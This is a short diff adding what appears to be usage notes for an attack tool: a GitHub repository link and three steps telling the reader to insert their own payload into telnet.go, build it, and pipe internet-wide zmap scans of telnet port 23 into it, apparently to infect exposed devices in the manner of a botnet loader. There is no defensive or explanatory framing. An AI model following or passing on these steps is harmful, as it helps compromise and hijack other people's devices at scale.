@@ -1,0 +1,5 @@
+https://github.com/kindercode1ne/tetagg.git
+
+1. Replace the payload in telnet.go with your payload
+2. Run "go build telnet.go"
+3. Start scanning with "ulimit -u999999; ulimit -n999999; zmap -p23 | ./telnet"
